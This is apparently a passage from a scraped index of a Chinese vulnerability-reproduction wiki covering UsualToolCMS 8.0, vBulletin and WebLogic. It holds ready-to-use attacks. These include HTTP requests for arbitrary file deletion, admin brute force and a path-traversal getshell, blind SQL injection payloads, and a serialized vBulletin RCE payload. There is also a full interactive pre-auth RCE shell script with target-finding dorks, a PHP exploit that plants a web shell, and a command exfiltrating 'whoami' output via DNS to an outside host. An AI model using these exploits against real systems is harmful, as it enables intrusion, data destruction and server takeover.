('$authcode','$webname','$weblogo','$weburl','$template','$webisclose','$develop','$articlelistnum','$indexarticlenum','$indexarticlerenum','$articlehitnum','$goodslistnum','$indexgoodsnum','$indexgoodsrenum','$goodshitnum','$article','$goods','$messagebook','$orders','$members','$usercookname',now())\"; if ($mysqli->query($sqls) == TRUE) { echo \"alert('基础设置完成!');window.location.href='?l=welcome'\"; }else{ echo \"alert('未设置成功!请重填!');window.location.href='?l=setup'\"; } }?> UsualToolcsm需要先设置数据库账号密码才可以安装sql_db.php文件。 这边是判断数据库连接是否成功， 如果成功执行下一步， 如果不成功反回未设置成功!请重填 p:437-438 成功安装以后反回一个默认账号密码 echo\"后台默认账号: usualtool\"; echo\"后台默认密码: 123456\"; 直接下一步就可以因为sql_db.php是提前设置好账号密码的 http://0-sec.org/UsualToolCMS/setup/ 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-05 16:06:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/UsualToolcms/1.html":{"url":"0day/UsualToolcms/1.html","title":"UsualToolcms 8.0 前台任意文件删除","keywords":"","body":"UsualToolcms前台任意文件删除 一、漏洞简介 前台myup.php文件最后一段存在任意文件删除 二、漏洞影响 UsualToolCMS-8.0-Release 三、复现过程 漏洞点：http://0-sec.org/myup.php 第47行只对..精心过滤，我仍然能任意删除网站内部的文件，直接构造poc， POST /UsualToolCMS/myup.php HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 25 get=delimg&imgurl=./1.php 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-05 15:48:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/UsualToolcms/2.html":{"url":"0day/UsualToolcms/2.html","title":"UsualToolcms 8.0 绕过后台验证码爆破","keywords":"","body":"UsualToolcms 8.0 绕过后台验证码爆破 一、漏洞简介 可通过删除验证码参数，进行暴力破解 二、漏洞影响 UsualToolCMS-8.0-Release 三、复现过程 漏洞点:http://0-sec.org/cmsadmin/ 后台登陆时默认需要输入验证码，但是当我把验证码的参数ucode删除时，登陆依然成功 1.默认情况下登陆数据包 删除ucode参数和cookie后登陆，直接登陆成功 通过burp爆破后台密码 POST /UsualToolCMS/cmsadmin/a_login.php?do=login HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_login.php X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 23 uuser=admin&upass=admin 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-12 16:07:50 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/UsualToolcms/3.html":{"url":"0day/UsualToolcms/3.html","title":"UsualToolcms 8.0 后台GETSHELL","keywords":"","body":"UsualToolcms 8.0 后台GETSHELL 一、漏洞简介 二、漏洞影响 UsualToolCMS-8.0-Release 三、复现过程 洞点:http://0-sec.org/cmsadmin/a_lang.php 13行未对$lg做判断 点击保存时抓包需要修改url处的lg参数这样就上传到跟目录了，再在post 参数的en后面加入 en\"}, POST /UsualToolCMS/cmsadmin/a_langx.php?x=m&lg=../1.php HTTP/1.1 Host: 0-sec.org User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0 Accept: text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate DNT: 1 Referer: http://192.168.235.242/UsualToolCMS/cmsadmin/a_langx.php?lg=lg-en.json Cookie: navleft=21; UTCMSLanguage=zh; PHPSESSID=1r5kk3jieflfbnseav3e5dnclo X-Forwarded-For: 8.8.8.8 Connection: close Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 9189 submit=保存语言包&keys[]=language&values[]=en\"},&keys[]=charset&values[]=utf-8&keys[]=speak&values[]=English&keys[]=web&values[]=UsualToolCMS&key[]=index&value[]=Home&key[]=article&value[]=Article&key[]=product&value[]=Product&key[]=picture&value[]=Picture&key[]=atlas&value[]=Atlas&key[]=contact&value[]=Contact&key[]=about&value[]=About&key[]=forum&value[]=Forum&key[]=register&value[]=Register&key[]=login&value[]=Login&key[]=news&value[]=News&key[]=job&value[]=Job&key[]=wages&value[]=Wages&key[]=application&value[]=Application&key[]=resume&value[]=Resume&key[]=shopcart&value[]=Shopcart&key[]=account&value[]=Account&key[]=member&value[]=Member&key[]=up&value[]=Up&key[]=down&value[]=Down&key[]=more&value[]=More&key[]=new&value[]=New&key[]=authorize&value[]=Authorize&key[]=authenticating&value[]=Authenticating&key[]=qq&value[]=QQ&key[]=membercenter&value[]=Member&key[]=username&value[]=Username&key[]=password&value[]=Password&key[]=forgotpass&value[]=Forgot&key[]=search&value[]=Search&key[]=detail&value[]=Detail&key[]=size&value[]=Size&key[]=spec&value[]=Spec&key[]=color&value[]=Color&key[]=aboutus&value[]=About Us&key[]=newgoods&value[]=New Product&key[]=topgoods&value[]=Top Product&key[]=link&value[]=Link&key[]=confirm&value[]=Confirm&key[]=email&value[]=Email&key[]=title&value[]=Title&key[]=content&value[]=Content&key[]=avatar&value[]=Avatar&key[]=sex&value[]=Sex&key[]=man&value[]=Man&key[]=woman&value[]=Woman&key[]=address&value[]=ADD.&key[]=tel&value[]=Tel&key[]=fax&value[]=Fax&key[]=introduction&value[]=Intro&key[]=validatecode&value[]=Captcha&key[]=changeit&value[]=Change it&key[]=order&value[]=Order&key[]=writeorder&value[]=Write Order&key[]=menu&value[]=Menu&key[]=balance&value[]=Balance&key[]=level&value[]=Level&key[]=writearticles&value[]=Write Articles&key[]=articlemanagement&value[]=Article Admin&key[]=articlebrowse&value[]=Article Browse&key[]=writeonline&value[]=Add New&key[]=payment&value[]=Payment&key[]=registrationtime&value[]=Reg Time&key[]=lastlogintime&value[]=Last Login&key[]=fullname&value[]=Full Name&key[]=privileges:discount&value[]=Privileges:Discount&key[]=state&value[]=State&key[]=source&value[]=Source&key[]=ordernumber&value[]=Order No.&key[]=money&value[]=Money&key[]=time&value[]=Time&key[]=finish&value[]=Finish&key[]=unpaid&value[]=Unpaid&key[]=deliver&value[]=Deliver&key[]=refund&value[]=Refund&key[]=goods&value[]=Goods&key[]=charge&value[]=Charge&key[]=other&value[]=Other&key[]=ordertime&value[]=Order Time&key[]=voucher&value[]=Voucher&key[]=customer&value[]=Customer&key[]=zipcode&value[]=Zip Code&key[]=logistics&value[]=Logistics&key[]=logisticscompany&value[]=Company&key[]=logisticsnumber&value[]=Number&key[]=logisticsdetails&value[]=Details&key[]=paymentmethod&value[]=Method&key[]=alipay&value[]=Alipay&key[]=wechatpay&value[]=Tencent Wechat&key[]=paypal&value[]=Paypal&key[]=waitinganswer&value[]=Waiting&key[]=answered&value[]=Answered&key[]=question&value[]=Question&key[]=reply&value[]=Reply&key[]=tencentaccount&value[]=Tencent&key[]=weiboaccount&value[]=Weibo&key[]=wechataccount&value[]=Wechat&key[]=binded&value[]=Binded&key[]=untie&value[]=Untie&key[]=quantity&value[]=Qty&key[]=parameter&value[]=Parm&key[]=total&value[]=Total&key[]=submit&value[]=Submit&key[]=delete&value[]=Del&key[]=unit&value[]=USD&key[]=actual&value[]=Actual&key[]=feedback&value[]=Feedback&key[]=otheraccount&value[]=Other Accounts&key[]=out&value[]=Out&key[]=ranking&value[]=Ranking&key[]=recommend&value[]=Recommend&key[]=tag&value[]=Tag&key[]=tags&value[]=Tags&key[]=read&value[]=Read&key[]=productdetails&value[]=Product Details&key[]=service&value[]=Service&key[]=category&value[]=Category&key[]=allcategory&value[]=All Category&key[]=stock&value[]=Stock&key[]=price&value[]=Price&key[]=sale&value[]=Sale&key[]=loginview&value[]=Login View&key[]=readme&value[]=Read Me&key[]=popularity&value[]=Popularity&key[]=details&value[]=Details&key[]=message&value[]=Message&key[]=original&value[]=Original&key[]=author&value[]=Author&key[]=pass&value[]=Pass&key[]=audit&value[]=Audit&key[]=return&value[]=Return&key[]=yes&value[]=Yes&key[]=no&value[]=No&key[]=modify&value[]=Modify&key[]=articlemodify&value[]=Article Modify&key[]=type&value[]=Type&key[]=moreupload&value[]=Up to upload&key[]=success&value[]=Success&key[]=fail&value[]=Fail&key[]=upload&value[]=Upload&key[]=uploadtime&value[]=Upload Time&key[]=contactus&value[]=Contact Us&key[]=previouspage&value[]=Prev&key[]=nextpage&value[]=Next&key[]=firstpage&value[]=First&key[]=lastpage&value[]=Last&key[]=totalpage&value[]=Total&key[]=currentpage&value[]=Current&key[]=buy&value[]=Buy&key[]=mailverify&value[]=Email validation&key[]=welcome&value[]=Welcome&key[]=close&value[]=closed&key[]=findpassword&value[]=Find Password&key[]=contactmanager&value[]=Contact Manager&key[]=orderdetaillogin&value[]=For order details,please visit the website.&key[]=enterusername&value[]=Please enter username!&key[]=enterpassword&value[]=Please enter password!&key[]=enteremail&value[]=Please enter Email!&key[]=emailerr&value[]=Email error!&key[]=entertitle&value[]=Please enter title!&key[]=entercontent&value[]=Please enter content!&key[]=selecttype&value[]=Type must be selected!&key[]=enterauthor&value[]=Please enter author!&key[]=enterpasswords&value[]=Please confirm the password!&key[]=passworderr&value[]=The codes don&key[]=entercaptcha&value[]=Please enter captcha!&key[]=captchaerr&value[]=Captcha error!&key[]=mailsenderr&value[]=Mail not sent!&key[]=mailok&value[]=Please check email!&key[]=pleasemailverify&value[]=Please check email for verification!&key[]=mailverifycode&value[]=Email Authentication Code&key[]=mailcopylink&value[]=Please copy the following link&key[]=totalnum&value[]=Total Num&key[]=updateok&value[]=Update successed!&key[]=updateno&value[]=Failed to update!&key[]=payok&value[]=Successful payment!&key[]=payno&value[]=Payment Failed!&key[]=createempty&value[]=Required field is empty!&key[]=createok&value[]=Create successed!&key[]=createno&value[]=Failed to create!&key[]=gotopay&value[]=Go to pay!&key[]=untieok&value[]=Untie successed!&key[]=untieno&value[]=Untie failed!&key[]=delok&value[]=Delete successed!&key[]=delno&value[]=Delete failed!&key[]=regclose&value[]=Website registration closed!&key[]=regmailerr&value[]=Account or email registered!&key[]=loginusererr&value[]=Account does not exist!&key[]=loginpasserr&value[]=Account or password does not match!&key[]=administratorreply&value[]=The administrator has not responded, please wait patiently.&key[]=noscript&value[]=Sorry, your browser disabled JavaScript, it may not be able to use some of the site&key[]=readmecontent&value[]=We guarantee that the outer packing of the goods is in good condition at the time of shipment. When you receive the goods, please carefully check whether the invoice and the goods are consistent with the delivery order. If you find that the goods are missing or damaged, please contact our customer service department on the spot when the delivery personnel are still on the scene; If you find that the package is damaged or the goods are damaged in transit, please point out and refuse to accept it on the spot. After refusal, please call our customer service. If you have signed for it or someone else has signed for it, you will be considered as the packaging, quantity and content of the goods. I will not be able to accept.&key[]=copyright&value[]=Copyright&key[]=cssdisplay&value[]=none&key[]=test&value[]=Test 请将上面post数据包内容进行url编码 csrf配合上面的后台getshell history.pushState('', '', '/') 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-12 16:45:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/UsualToolcms/4.html":{"url":"0day/UsualToolcms/4.html","title":"UsualToolcms 8.0 后台盲注","keywords":"","body":"UsualToolcms 8.0 后台盲注 一、漏洞简介 二、漏洞影响 UsualToolCMS-8.0-Release 三、复现过程 漏洞分析 ./cmsadmin/a_users_level.php第19行和第26行，id参数可控 从get处获取id参数，id存在无任何过滤，当postt id时，通过sqlcheck函数进行过滤，来到文件./class/UsualToolCMS_INC.php第33行，将(',\\,\",null)转义，34行调用sqlchecks函数，比没过滤sql，然而a_users_level.php第19行id不是字符 复现 可以利用时间盲注来进行sql注入攻击，payload如下： a.当前数据库：http://0-sec.org:8080/UsualToolCMS/cmsadmin/a_users_level.php?x=m&id=2 and if(ascii(substr(user(),1,1))=114,sleep(6),1) b.表：http://0-sec.org:8080/UsualToolCMS/cmsadmin/a_users_level.php?x=m&id=2 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>30,sleep(6),1) 时间盲注验证脚本 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-05 16:11:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/UsualToolcms/6.html":{"url":"0day/UsualToolcms/6.html","title":"UsualToolcms 8.0 前台sql","keywords":"","body":"UsualToolcms 8.0 前台sql 一、漏洞简介 二、漏洞影响 三、复现过程 漏洞分析 search.php $key=UsualToolCMS::sqlcheck($_GET[\"key\"]); $navname=\"search\"; require_once(dirname(__FILE__).'/'.'mytop.php'); //搜索记录 if(!empty($key)): $asql=\"SELECT * FROM `cms_search` WHERE keyword ='$key'\"; $adata=mysqli_query($mysqli,$asql); if(mysqli_num_rows($adata)>0): $mysqli->query(\"UPDATE `cms_search` SET `hit`=hit+1 WHERE keyword ='$key' and lang='$language'\"); else: $mysqli->query(\"INSERT INTO `cms_search` (`lang`,`keyword`) VALUES ('$language','$key')\"); $key被sqlcheck函数过滤了，让我们看下这个函数 function sqlchecks($StrPost){ $StrPost=str_replace(\"'\",\"’\",$StrPost); $StrPost=str_replace('\"','“',$StrPost); $StrPost=str_replace(\"(\",\"（\",$StrPost); $StrPost=str_replace(\")\",\"）\",$StrPost); $StrPost=str_replace(\"@\",\"#\",$StrPost); $StrPost=str_replace(\"/*\",\"\",$StrPost); $StrPost=str_replace(\"*/\",\"\",$StrPost); return $StrPost; } 如果没有Url编码的话这里应该是不存在漏洞的了，仔细看上面的代码，数据库操作中还有一个$language,我们追踪下$language吧 全局查找，直接找到其定义的地方 conn.php if(!empty($_COOKIE['UTCMSLanguage'])):$language=$_COOKIE['UTCMSLanguage'];else:$language=$indexlanguage;endif; $language没有经过任何过滤就从Cookie传了进来 这就简单咯 复现 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-05 16:13:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/vBulletin/CVE-2015-7808.html":{"url":"0day/vBulletin/CVE-2015-7808.html","title":"（CVE-2015-7808）远程命令执行漏洞","keywords":"","body":"CVE-2015-7808 一、漏洞简介 二、漏洞影响 VBulletin VBulletin 5.1.4 - 5.1.9 三、复现过程 $ php functions['free_result'] = 'assert'; } } class vB_dB_Result { protected $db; protected $recordset; public function __construct() { $this->db = new vB_Database_MySQL(); $this->recordset = \"phpinfo()\"; } } print urlencode(serialize(new vB_dB_Result())) . \"n\"; eof http://0-sec.org/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-22 22:15:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/vBulletin/1.html":{"url":"0day/vBulletin/1.html","title":"（CVE-2019-16759）vBulletin 5.x 0day pre-auth RCE exploit","keywords":"","body":"（CVE-2019-16759）vBulletin 5.x 0day pre-auth RCE exploit 一、漏洞简介 二、漏洞影响 影响版本：vBulletin 5.0.0~5.5.4 三、复现过程 poc如下: #!/usr/bin/python # # vBulletin 5.x 0day pre-auth RCE exploit # # This should work on all versions from 5.0.0 till 5.5.4 # # Google Dorks: # - site:*.vbulletin.net # - \"Powered by vBulletin Version 5.5.4\" import requests import sys if len(sys.argv) != 2: sys.exit(\"Usage: %s \" % sys.argv[0]) params = {\"routestring\":\"ajax/render/widget_php\"} while True: try: cmd = raw_input(\"vBulletin$ \") params[\"widgetConfig[code]\"] = \"echo shell_exec('\"+cmd+\"'); exit;\" r = requests.post(url = sys.argv[1], data = params) if r.status_code == 200: print r.text else: sys.exit(\"Exploit failed! :(\") except KeyboardInterrupt: sys.exit(\" Closing shell...\") except Exception, e: sys.exit(str(e)) 将poc代码修改为python3使用的代码，并添加代理使用burpsuite抓包。修改的poc代码如下： # -*-coding:utf-8 -*- import requests import sys if len(sys.argv) != 2: sys.exit(\"Usage: %s \" % sys.argv[0]) proxies ={ \"http\":\"http://127.0.0.1:8080/\" } params = {\"routestring\":\"ajax/render/widget_php\"} while True: try: cmd = input(\">>>Shell= \") params[\"widgetConfig[code]\"] = \"echo shell_exec('\"+cmd+\"'); exit;\" r = requests.post(url = sys.argv[1], data = params, proxies=proxies) if r.status_code == 200: print(r.text) else: sys.exit(\"Exploit failed! :(\") except KeyboardInterrupt: sys.exit(\"\\nClosing shell...\") except Exception as e: sys.exit(str(e)) 远程代码执行漏洞的触发点是未经过验证的用户通过向index.php发送routestring参数，当routesting参数是ajax/render/widget_php，通过widgetConfig[code]执行远程代码，格式为echo shell_exec('\"+cmd+\"'); exit; 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-21 20:18:43 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/vBulletin/2.html":{"url":"0day/vBulletin/2.html","title":"（CVE-2019-17132）vBulletin 5.0 <5.5.4-'updateAvatar'身份验证的远程代码执行漏洞","keywords":"","body":"（CVE-2019-17132）vBulletin 5.0 一、漏洞简介 用户输入更新头像的的时候，前未正确验证提交的“数据[扩展]”和“数据[文件数据]”参数就发送到了“ ajax / api / user / updateavatar”，导致此突破的产生 利用此突破可以插入和执行任意php代码。 成功利用此突破需要“将头像另存为Files（头像保存为文件）”选项要启用（可选情况下少量）。 二、漏洞影响 三、复现过程 \\n\"; print \"\\nExample....: php $argv[0] http://localhost/vb/ user passwd\"; print \"\\nExample....: php $argv[0] [url]https://vbulletin.com/[/url] evil hacker\\n\\n\"; die(); } list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]]; $ch = curl_init(); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_HEADER, true); print \"\\n[-] Logging in with username '{$user}' and password '{$pass}'\\n\"; curl_setopt($ch, CURLOPT_URL, $url); if (!preg_match(\"/Cookie: .*sessionhash=[^;]+/\", curl_exec($ch), $sid)) die(\"[-] Session ID not found!\\n\"); curl_setopt($ch, CURLOPT_URL, \"{$url}?routestring=auth/login\"); curl_setopt($ch, CURLOPT_HTTPHEADER, $sid); curl_setopt($ch, CURLOPT_POSTFIELDS, \"username={$user}&password={$pass}\"); if (!preg_match(\"/Cookie: .*sessionhash=[^;]+/\", curl_exec($ch), $sid)) die(\"[-] Login failed!\\n\"); print \"[-] Logged-in! Retrieving security token...\\n\"; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POST, false); curl_setopt($ch, CURLOPT_HTTPHEADER, $sid); if (!preg_match('/token\": \"([^\"]+)\"/', curl_exec($ch), $token)) die(\"[-] Security token not found!\\n\"); print \"[-] Uploading new avatar...\\n\"; $params = [\"profilePhotoFile\" => new CURLFile(\"avatar.jpeg\"), \"securitytoken\" => $token[1]]; curl_setopt($ch, CURLOPT_URL, \"{$url}?routestring=profile/upload-profilepicture\"); curl_setopt($ch, CURLOPT_POSTFIELDS, $params); curl_setopt($ch, CURLOPT_HEADER, false); if (($path = (json_decode(curl_exec($ch)))->avatarpath) == null) die(\"[-] Upload failed!\\n\"); if (preg_match('/image\\.php\\?/', $path)) die(\"[-] Sorry, the 'Save Avatars as Files' option is disabled!\\n\"); print \"[-] Updating avatar with PHP shell...\\n\"; $php_code = ''; $params = [\"routestring\" => \"ajax/api/user/updateAvatar\", \"userid\" => 0, \"avatarid\" => 0, \"data[extension]\" => \"php\", \"data[filedata]\" => $php_code, \"securitytoken\" => $token[1]]; curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params)); if (curl_exec($ch) !== \"true\") die(\"[-] Update failed!\\n\"); print \"[-] 上传shell中...\\n\"; preg_match('/(\\d+)\\.jpeg/', $path, $m); $path = preg_replace('/(\\d+)\\.jpeg/', ($m[1]+1).\".php\", $path); curl_setopt($ch, CURLOPT_URL, \"{$url}core/{$path}\"); curl_setopt($ch, CURLOPT_POST, false); while(1) { print \"\\nvb-shell# \"; if (($cmd = trim(fgets(STDIN))) == \"exit\") break; curl_setopt($ch, CURLOPT_HTTPHEADER, [\"CMD: \".base64_encode($cmd)]); preg_match('/____(.*)/s', curl_exec($ch), $m) ? print $m[1] : die(\"\\n[-] Exploit failed!\\n\"); } 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-03 17:05:54 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/weblogic爆破.html":{"url":"0day/Weblogic/weblogic爆破.html","title":"weblogic爆破","keywords":"","body":"weblogic爆破 一、部署weblogic 现有的redhat环境7.0,jdk版本1.7。 二、weblogic下载 操作系统：RedHat7 weblogic版本：10.3.6 三、安装weblogic 1、weblogic安装 创建一个用户 useradd weblogic passwd weblogic chmod a+x wls1036_generic.jar su weblogic java -jar wls1036_generic.jar -mode=console 出现问题 提示空间内存大小不够，清理空间再下一步。 [root@localhostsrc]# cd /usr/lib/jvm/java-1.7.0-openjdk-1.7.0.51-2.4.5.5.el7.x86_64 修改 commEnv.sh 文件 JAVA_HOME=\"/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.9.x86_64/ jre\" 2、启动weblogic [weblogic@localhostroot]$cd /home/weblogic/Oracle/Middleware/user_projects/domains/base_domain/ [weblogic@localhost base_domain]$ ./startWebLogic.sh 在目录/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.79.x86_64中找不到JRE 编辑setDomainEnv.sh 重新启动weblogic服务 四、破解weblogic控制台密码 第一步 将用户名和密码保存到boot.properties文件中 [root@localhost security]# pwd /home/weblogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security 在adminserver目录下创建security目录，并创建文件boot.properties Username=weblogic Password=weblogic123 第二步 重新启动WebLogic服务 [root@localhost bin]# ./startWebLogic.sh& 已经加密 第三步 暴力破解 1.java和javac的版本一致 2.编译WebLogicPasswordDecryptor.java 3.破解密码 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 23:37:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2017-3248）.html":{"url":"0day/Weblogic/（CVE-2017-3248）.html","title":"（CVE-2017-3248）","keywords":"","body":"CVE-2017-3248 一、漏洞简介 二、漏洞影响 WebLogic 10.3.6.0WebLogic 12.1.3.0WebLogic 12.2.1.0WebLogic 12.2.1.1 三、复现过程 http://www.0-sec.org/download/CVE-2017-3248.rar 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 22:07:15 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2017-3506）.html":{"url":"0day/Weblogic/（CVE-2017-3506）.html","title":"（CVE-2017-3506）","keywords":"","body":"（CVE-2017-3506） 一、漏洞简介 二、漏洞影响 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.2.0 三、复现过程 https://github.com/ianxtianxt/CVE-2017-3506 [*] 漏洞编号 CVE-2017-3506 & CVE-2017-10271 [*] 漏洞详情 https://www.secfree.com/article-635.html [*] 作者邮箱 Bearcat@secfree.com [*] 使用方法: [*] 单个检测 -u http://Host:Port [*] 批量检测 -f url.txt [*] 上传木马 -s http://Host:Port /wls-wsat/CoordinatorPortType11 shell.jsp [*] wls-wsat组件路径： /wls-wsat/CoordinatorPortType /wls-wsat/CoordinatorPortType11 /wls-wsat/ParticipantPortType /wls-wsat/ParticipantPortType11 /wls-wsat/RegistrationPortTypeRPC /wls-wsat/RegistrationPortTypeRPC11 /wls-wsat/RegistrationRequesterPortType /wls-wsat/RegistrationRequesterPortType11 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 22:12:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2017-10271）.html":{"url":"0day/Weblogic/（CVE-2017-10271）.html","title":"（CVE-2017-10271）","keywords":"","body":"(CVE-2017-10271)Java反序列化漏洞 一、漏洞简介 二、漏洞影响 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.1.0 Oracle WebLogic Server12.2.1.3.0 三、复现过程 exp https://github.com/ianxtianxt/-CVE-2017-10271- poc xml 文件 /Applications/Calculator.app/Contents/MacOS/Calculator 读取xml文件，进行反序列化执行命令代码： import java.io.BufferedInputStream; import java.io.FileInputStream; import java.io.FileNotFoundException; public class xmlrce { public static void main(String[] args) { // TODO Auto-generated method stub java.io.File file = new java.io.File(\"/Users/pirogue/IdeaProjects/weblogic/src/poc.xml\"); java.beans.XMLDecoder xd = null; try { xd = new java.beans.XMLDecoder(new BufferedInputStream(new FileInputStream(file))); } catch (FileNotFoundException e) { // TODO Auto-generated catch block e.printStackTrace(); } Object s2 = xd.readObject(); xd.close(); } } CVE-2017-10271 weblogic反序列化漏洞 WLSServletAdapter.class public void handle(ServletContext var1, HttpServletRequest var2, HttpServletResponse var3) throws IOException { if (var2.getMethod().equals(\"GET\") || var2.getMethod().equals(\"HEAD\")) { HttpMetadataPublisher var4 = (HttpMetadataPublisher)this.endpoint.getSPI(HttpMetadataPublisher.class); if (var4 != null && var4.handleMetadataRequest(this, this.createConnection(var1, var2, var3))) { return; } if (this.isOraWsdlMetadataQuery(var2.getQueryString())) { this.publishWSDL(this.createConnection(var1, var2, var3)); return; } } super.handle(var1, var2, var3); } 当开启调试模式，ping时，WLSServletAdapter对请求进行接收处理，执行到super.handle(var1, var2, var3);后，跟进关键代码如下： WorkContentServerTube.class public NextAction processRequest(Packet var1) { this.isUseOldFormat = false; if (var1.getMessage() != null) { HeaderList var2 = var1.getMessage().getHeaders(); Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, true); if (var3 != null) { this.readHeaderOld(var3); this.isUseOldFormat = true; } Header var4 = var2.get(this.JAX_WS_WORK_AREA_HEADER, true); if (var4 != null) { this.readHeader(var4); } } return super.processRequest(var1); } 将var3传递给readHeaderOld(var3)，继续跟进readHeaderOld。 var1的值: com.sun.xml.ws.api.message.Packet@4419bacb Content: /bin/bash -c ping `whoami`.7153b738c41fxxxxxxaadf9dbd46.tu4.org WorkContextTube.class protected void readHeaderOld(Header var1) { try { XMLStreamReader var2 = var1.readHeader(); var2.nextTag(); var2.nextTag(); XMLStreamReaderToXMLStreamWriter var3 = new XMLStreamReaderToXMLStreamWriter(); ByteArrayOutputStream var4 = new ByteArrayOutputStream(); XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4); var3.bridge(var2, var5); var5.close(); WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray())); this.receive(var6); } catch (XMLStreamException var7) { throw new WebServiceException(var7); } catch (IOException var8) { throw new WebServiceException(var8); } } 基础知识拓展： ByteArrayInputStream的用法： InputStream |__ ByteArrayInputStream OutputStream |__ ByteArrayOutputStream ByteArrayInputStream可以将字节数组转化为输入流。ByteArrayOutputStream可以捕获内存缓冲区的数据，转化成字节数组。 构造函数： public ByteArrayInputStream(byte buf[]) public ByteArrayInputStream(byte buf[], int offset, int length) 注意它需要提供一个byte数组作为缓冲区。 我们通过idea代码窗口内可以看到各个变量在调试运行后的值，var4的值就是接收poc的xml，在 WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray())); 中，要创建WorkContextXmlInputAdapter的实例var6, 